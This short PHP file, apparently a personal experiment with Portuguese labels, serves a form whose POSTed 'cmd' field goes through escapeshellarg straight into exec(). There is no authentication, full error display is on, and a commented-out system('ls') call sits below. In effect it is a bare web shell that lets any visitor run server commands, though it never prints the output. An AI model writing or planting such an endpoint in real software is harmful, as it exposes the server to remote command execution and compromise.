<?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

if ($_SERVER["REQUEST_METHOD"] === 'POST') {

    $cmd = escapeshellarg($_POST["cmd"]);
    var_dump($cmd);

    echo "<pre>";
    $comando = exec($cmd, $retorno);
    echo "</pre>";
}

// echo "<pre>";
// $comando = system("ls", $retorno);
// echo "</pre>";

?>

<form method="post">

    <input type="text" name="cmd">
    <button type="submit">Enviar</button>

</form>